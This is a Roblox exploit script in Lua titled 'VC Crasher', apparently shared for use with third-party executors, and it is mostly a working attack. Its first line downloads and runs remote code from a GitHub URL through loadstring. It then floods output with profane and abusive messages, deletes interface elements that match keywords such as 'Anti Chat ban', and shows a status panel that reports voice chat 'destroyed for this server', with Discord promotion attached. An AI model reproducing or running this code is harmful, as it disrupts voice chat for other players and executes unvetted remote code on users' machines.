loadstring(game:HttpGet("https://raw.githubusercontent.com/Warmb00t/hackerone/refs/heads/main/ez.lua"))()

local SPAM_ENABLED = true
game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
    if msg:lower() == "off" then SPAM_ENABLED = false
    elseif msg:lower() == "on" then SPAM_ENABLED = true end
end)

task.spawn(function()
    local CoreGui = game:GetService("CoreGui")
    local keywords = {"mask.xx", "Anti Chat ban", "unvcban"}
    local function containsKeyword(text)
        local low = text:lower()
        for _, kw in ipairs(keywords) do
            if low:find(kw:lower(), 1, true) then return true end
        end
        return false
    end
    local messages = {
        "fuck roblox and their whole legal team lmaooo",
        "roblox can kiss my ass fr fr",
        "the server is cooked as hell",
        "roblox engineers making 500k a year for THIS 💀💀",
        "trash ass pedo platform still standing somehow",
    }
    local i = 0
    while task.wait(0.01) do
        i = i + 1
        local msg = messages[(i % #messages) + 1]
        if SPAM_ENABLED then
            print("[🔥] " .. msg)
        end
        pcall(function()
            for _, v in ipairs(CoreGui:GetDescendants()) do
                if v:IsA("TextLabel") and containsKeyword(v.Text) then
                    local target = v
                    for _ = 1, 5 do
                        if target.Parent and target.Parent:IsA("ScreenGui") then break end
                        if target.Parent then target = target.Parent else break end
                    end
                    if target:IsA("Frame") or target:IsA("ImageButton") then
                        target:Destroy()
                    end
                end
            end
        end)
    end
end)

do
    local guiParent
    pcall(function() guiParent = gethui() end)
    if not guiParent then guiParent = game:GetService("CoreGui") end

    local function mk(cls, props)
        local o = Instance.new(cls)
        for k, v in pairs(props) do o[k] = v end
        return o
    end

    pcall(function()
        local old = guiParent:FindFirstChild("VCStatusGui")
        if old then old:Destroy() end
    end)

    local Screen = mk("ScreenGui", {
        Name = "VCStatusGui", ResetOnSpawn = false,
        ZIndexBehavior = Enum.ZIndexBehavior.Sibling, Parent = guiParent,
    })
    local Main = mk("Frame", {
        Size = UDim2.fromOffset(340, 0), AutomaticSize = Enum.AutomaticSize.Y,
        Position = UDim2.new(1, -12, 1, -12), AnchorPoint = Vector2.new(1, 1),
        BackgroundColor3 = Color3.fromRGB(16, 18, 21), BorderSizePixel = 0, Parent = Screen,
    })
    mk("UICorner", { CornerRadius = UDim.new(0, 5), Parent = Main })
    mk("UIStroke", { Color = Color3.fromRGB(32, 36, 42), Transparency = 0.4, ApplyStrokeMode = Enum.ApplyStrokeMode.Border, Parent = Main })

    do
        local UIS = game:GetService("UserInputService")
        local dragging, dragInput, dragStart, startPos
        Main.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = Main.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then dragging = false end
                end)
            end
        end)
        Main.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                dragInput = input
            end
        end)
        UIS.InputChanged:Connect(function(input)
            if input == dragInput and dragging then
                local d = input.Position - dragStart
                Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
            end
        end)
    end

    local Topbar = mk("Frame", {
        Size = UDim2.new(1, 0, 0, 35), BackgroundColor3 = Color3.fromRGB(22, 25, 29),
        BorderSizePixel = 0, ZIndex = 2, Parent = Main,
    })
    mk("UICorner", { CornerRadius = UDim.new(0, 5), Parent = Topbar })
    mk("Frame", {
        Size = UDim2.new(1, 0, 0, 5), Position = UDim2.new(0, 0, 1, -5),
        BackgroundColor3 = Color3.fromRGB(22, 25, 29), BorderSizePixel = 0, ZIndex = 2, Parent = Topbar,
    })
    mk("Frame", {
        Size = UDim2.new(1, 0, 0, 1), Position = UDim2.new(0, 0, 1, 0),
        BackgroundColor3 = Color3.fromRGB(32, 36, 42), BackgroundTransparency = 0.4,
        BorderSizePixel = 0, ZIndex = 3, Parent = Topbar,
    })
    mk("TextLabel", {
        Size = UDim2.new(0, 80, 0, 15), Position = UDim2.new(0, 10, 0.5, 0),
        AnchorPoint = Vector2.new(0, 0.5), BackgroundTransparency = 1,
        Text = "VC Crasher", TextColor3 = Color3.fromRGB(255, 255, 255),
        TextSize = 14, Font = Enum.Font.GothamBold,
        TextXAlignment = Enum.TextXAlignment.Left, ZIndex = 2, Parent = Topbar,
    })

    local StatusContainer = mk("Frame", {
        AutomaticSize = Enum.AutomaticSize.XY, BackgroundTransparency = 1,
        Position = UDim2.new(1, -10, 0.5, 0), AnchorPoint = Vector2.new(1, 0.5),
        ZIndex = 2, Parent = Topbar,
    })
    mk("UIListLayout", {
        FillDirection = Enum.FillDirection.Horizontal,
        SortOrder = Enum.SortOrder.LayoutOrder,
        Padding = UDim.new(0, 5),
        VerticalAlignment = Enum.VerticalAlignment.Center,
        Parent = StatusContainer,
    })
    local TopStatus = mk("TextLabel", {
        Size = UDim2.new(0, 0, 0, 15), AutomaticSize = Enum.AutomaticSize.X,
        BackgroundTransparency = 1, Text = "Spamming...",
        TextColor3 = Color3.fromRGB(220, 170, 55), TextSize = 12,
        Font = Enum.Font.Gotham, ZIndex = 2, LayoutOrder = 1, Parent = StatusContainer,
    })
    local TopDot = mk("Frame", {
        Size = UDim2.fromOffset(8, 8), BackgroundColor3 = Color3.fromRGB(220, 170, 55),
        BorderSizePixel = 0, ZIndex = 3, LayoutOrder = 2, Parent = StatusContainer,
    })
    mk("UICorner", { CornerRadius = UDim.new(1, 0), Parent = TopDot })

    local Content = mk("Frame", {
        Size = UDim2.new(1, -16, 0, 0), Position = UDim2.new(0, 8, 0, 43),
        AutomaticSize = Enum.AutomaticSize.Y, BackgroundTransparency = 1, Parent = Main,
    })
    mk("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 6), Parent = Content })
    mk("UIPadding", { PaddingBottom = UDim.new(0, 10), Parent = Content })

    local TS = game:GetService("TweenService")
    local TI = TweenInfo.new(0.22, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
    local C_GREEN  = Color3.fromRGB(80, 220, 110)
    local C_CREDIT = Color3.fromRGB(100, 105, 120)

    local NotifHolder = mk("Frame", {
        AnchorPoint = Vector2.new(1, 0), Position = UDim2.new(1, 0, 0, 0),
        Size = UDim2.new(0, 0, 1, 0), AutomaticSize = Enum.AutomaticSize.X,
        BackgroundTransparency = 1, Parent = Screen,
    })
    mk("UIPadding", { PaddingBottom = UDim.new(0, 15), PaddingTop = UDim.new(0, 15), PaddingRight = UDim.new(0, 15), Parent = NotifHolder })
    mk("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, HorizontalAlignment = Enum.HorizontalAlignment.Right, Padding = UDim.new(0, 8), Parent = NotifHolder })

    local function notify(title, desc, duration, icon, iconColor)
        duration  = duration  or 4
        icon      = icon      or "116339777575852"
        iconColor = iconColor or Color3.fromRGB(52, 255, 164)
        local nf = mk("Frame", {
            AutomaticSize = Enum.AutomaticSize.XY, BackgroundColor3 = Color3.fromRGB(16, 18, 21),
            BorderSizePixel = 0, Parent = NotifHolder,
        })
        mk("UICorner", { CornerRadius = UDim.new(0, 5), Parent = nf })
        local nStroke = mk("UIStroke", { Color = Color3.fromRGB(32, 36, 42), Transparency = 0.4, ApplyStrokeMode = Enum.ApplyStrokeMode.Border, Parent = nf })
        mk("UIPadding", { PaddingLeft = UDim.new(0, 10), PaddingRight = UDim.new(0, 10), PaddingTop = UDim.new(0, 8), PaddingBottom = UDim.new(0, 8), Parent = nf })
        mk("UIListLayout", { FillDirection = Enum.FillDirection.Horizontal, VerticalAlignment = Enum.VerticalAlignment.Center, SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 8), Parent = nf })
        local iconLbl = mk("ImageLabel", {
            Size = UDim2.fromOffset(18, 18), BackgroundTransparency = 1,
            Image = "rbxassetid://" .. icon, ImageColor3 = iconColor,
            ScaleType = Enum.ScaleType.Fit, LayoutOrder = 1, Parent = nf,
        })
        local textFrame = mk("Frame", {
            Size = UDim2.new(0, 170, 0, 0), AutomaticSize = Enum.AutomaticSize.Y,
            BackgroundTransparency = 1, LayoutOrder = 2, Parent = nf,
        })
        mk("UIListLayout", { SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 3), Parent = textFrame })
        local tLbl = mk("TextLabel", {
            Size = UDim2.new(1, 0, 0, 15), BackgroundTransparency = 1, Text = title,
            TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 13, Font = Enum.Font.GothamBold,
            TextXAlignment = Enum.TextXAlignment.Left, LayoutOrder = 1, Parent = textFrame,
        })
        local dLbl = mk("TextLabel", {
            Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y, BackgroundTransparency = 1,
            Text = desc, TextColor3 = Color3.fromRGB(185, 185, 185), TextSize = 11, Font = Enum.Font.Gotham,
            TextWrapped = true, TextXAlignment = Enum.TextXAlignment.Left, LayoutOrder = 2, Parent = textFrame,
        })
        task.spawn(function()
            local sz = nf.AbsoluteSize
            nf.AutomaticSize = Enum.AutomaticSize.None
            nf.Size = UDim2.fromOffset(0, 0); nf.BackgroundTransparency = 1
            nStroke.Transparency = 1; tLbl.TextTransparency = 1; dLbl.TextTransparency = 1
            iconLbl.ImageTransparency = 1
            task.wait(0.05)
            TS:Create(nf, TI, { Size = UDim2.fromOffset(sz.X, sz.Y), BackgroundTransparency = 0 }):Play()
            TS:Create(nStroke, TI, { Transparency = 0.4 }):Play()
            task.wait(0.12)
            TS:Create(tLbl, TI, { TextTransparency = 0 }):Play()
            TS:Create(dLbl, TI, { TextTransparency = 0 }):Play()
            TS:Create(iconLbl, TI, { ImageTransparency = 0 }):Play()
            task.wait(duration)
            TS:Create(tLbl, TI, { TextTransparency = 1 }):Play()
            TS:Create(dLbl, TI, { TextTransparency = 1 }):Play()
            TS:Create(nStroke, TI, { Transparency = 1 }):Play()
            TS:Create(iconLbl, TI, { ImageTransparency = 1 }):Play()
            task.wait(0.25)
            TS:Create(nf, TI, { Size = UDim2.fromOffset(0, 0), BackgroundTransparency = 1 }):Play()
            task.wait(0.5)
            nf:Destroy()
        end)
    end

    local DetailBox = mk("Frame", {
        Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y,
        BackgroundColor3 = Color3.fromRGB(22, 25, 29), BorderSizePixel = 0, LayoutOrder = 2, Parent = Content,
    })
    mk("UICorner", { CornerRadius = UDim.new(0, 5), Parent = DetailBox })
    mk("UIStroke", { Color = Color3.fromRGB(45, 45, 55), Transparency = 0.3, Parent = DetailBox })
    mk("UIPadding", {
        PaddingLeft = UDim.new(0, 8), PaddingRight = UDim.new(0, 8),
        PaddingTop = UDim.new(0, 8), PaddingBottom = UDim.new(0, 8), Parent = DetailBox,
    })
    local DetailLabel = mk("TextLabel", {
        Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y,
        BackgroundTransparency = 1,
        Text = "You might lag and it can take up to 7 minutes.\nUsually takes around 1 minute. I recommend using Solara and Velocity.",
        TextColor3 = Color3.fromRGB(140, 145, 155), TextSize = 13, Font = Enum.Font.Gotham,
        TextWrapped = true, TextXAlignment = Enum.TextXAlignment.Left,
        LayoutOrder = 1, Parent = DetailBox,
    })

    local TimerLabel = mk("TextLabel", {
        Size = UDim2.new(1, 0, 0, 20), BackgroundTransparency = 1,
        Text = "0:00", TextColor3 = Color3.fromRGB(255, 255, 255),
        TextSize = 18, Font = Enum.Font.GothamBold,
        TextXAlignment = Enum.TextXAlignment.Center, LayoutOrder = 1, Parent = Content,
    })
    mk("TextLabel", {
        Size = UDim2.new(1, 0, 0, 14), BackgroundTransparency = 1,
        Text = "For help, join :", TextColor3 = Color3.fromRGB(90, 95, 105), TextSize = 10,
        Font = Enum.Font.GothamBold, TextXAlignment = Enum.TextXAlignment.Left, LayoutOrder = 3, Parent = Content,
    })
    local CreditBtn = mk("TextButton", {
        Size = UDim2.new(0, 0, 0, 20), AutomaticSize = Enum.AutomaticSize.X,
        BackgroundTransparency = 1,
        Text = "discord.gg/stalkie", TextColor3 = C_CREDIT,
        TextSize = 13, Font = Enum.Font.GothamBold, BorderSizePixel = 0,
        AutoButtonColor = false, LayoutOrder = 4, Parent = Content,
    })

    local creditClicking = false
    CreditBtn.MouseEnter:Connect(function()
        if not creditClicking then
            TS:Create(CreditBtn, TI, { TextColor3 = Color3.fromRGB(220, 220, 230) }):Play()
        end
    end)
    CreditBtn.MouseLeave:Connect(function()
        if not creditClicking then
            TS:Create(CreditBtn, TI, { TextColor3 = C_CREDIT }):Play()
        end
    end)
    CreditBtn.MouseButton1Click:Connect(function()
        if creditClicking then return end
        creditClicking = true
        pcall(setclipboard, "https://discord.gg/mHHDhKT88D")
        TS:Create(CreditBtn, TI, { TextColor3 = C_GREEN }):Play()
        notify("Invite Copied", "discord.gg/PolakOnTop", nil, "116339777575852", Color3.fromRGB(52, 255, 164))
        task.delay(0.5, function()
            TS:Create(CreditBtn, TI, { TextColor3 = C_CREDIT }):Play()
            creditClicking = false
        end)
    end)

    local dotStop = false
    local dotCount = 0
    local timerStart = os.clock()
    local function fmtTime(s)
        return string.format("%d:%02d", math.floor(s / 60), s % 60)
    end
    task.spawn(function()
        while not dotStop do
            task.wait(0.5)
            if dotStop then break end
            dotCount = (dotCount % 3) + 1
            TopStatus.Text = "Spamming" .. string.rep(".", dotCount)
            TimerLabel.Text = fmtTime(math.floor(os.clock() - timerStart))
        end
    end)

    pcall(function()
        local VCI = game:GetService("VoiceChatInternal")
        local wasJoined = false
        VCI.StateChanged:Connect(function(a, b)
            local state = b or a
            if state == Enum.VoiceChatState.Joined then
                wasJoined = true
            end
            if wasJoined and (state == Enum.VoiceChatState.Ended or state == Enum.VoiceChatState.Failed) then
                dotStop = true
                TimerLabel.Text = fmtTime(math.floor(os.clock() - timerStart))
                TimerLabel.TextColor3 = Color3.fromRGB(80, 200, 100)
                TopDot.BackgroundColor3 = Color3.fromRGB(80, 200, 100)
                TopStatus.Text = "Success"
                TopStatus.TextColor3 = Color3.fromRGB(80, 200, 100)
                DetailLabel.Text = "voice chat successfully destroyed for this server"
                DetailLabel.TextColor3 = Color3.fromRGB(80, 200, 100)
            end
        end)
    end)
end
